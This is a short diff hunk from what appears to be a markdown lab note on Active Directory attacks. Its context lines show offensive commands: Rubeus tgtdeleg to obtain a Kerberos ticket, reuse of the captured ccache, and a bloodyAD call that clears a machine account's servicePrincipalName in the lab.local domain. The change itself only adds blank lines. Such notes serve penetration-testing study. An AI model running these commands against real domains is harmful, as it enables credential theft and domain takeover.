@@ -16,3 +16,5 @@ Rubeus.exe tgtdeleg
 export KRB5CCNAME=/tmp/ws02.ccache
 python bloodyAD -d lab.local -u 'ws02$' -k --host dc.lab.local setAttribute 'CN=ws02,CN=Computers,DC=lab,DC=local' servicePrincipalName '[]'
 ```
+
+
